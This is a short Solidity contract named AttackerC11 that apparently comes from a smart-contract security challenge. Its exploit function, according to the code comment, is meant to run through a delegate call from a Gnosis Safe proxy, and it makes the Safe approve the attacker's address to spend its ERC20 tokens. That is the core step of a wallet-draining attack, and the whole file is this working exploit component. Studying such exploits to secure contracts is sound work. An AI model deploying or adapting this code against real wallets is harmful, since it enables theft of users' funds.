// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackerC11
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC11 {
    IERC20 immutable token;
    address immutable attacker;

    constructor(address _token) {
        attacker = msg.sender;
        token = IERC20(_token);
    }

    // Used in a delegate call from GnosisSafeProxy
    function exploit(uint256 amount) external {
        token.approve(attacker, amount);
    }
}
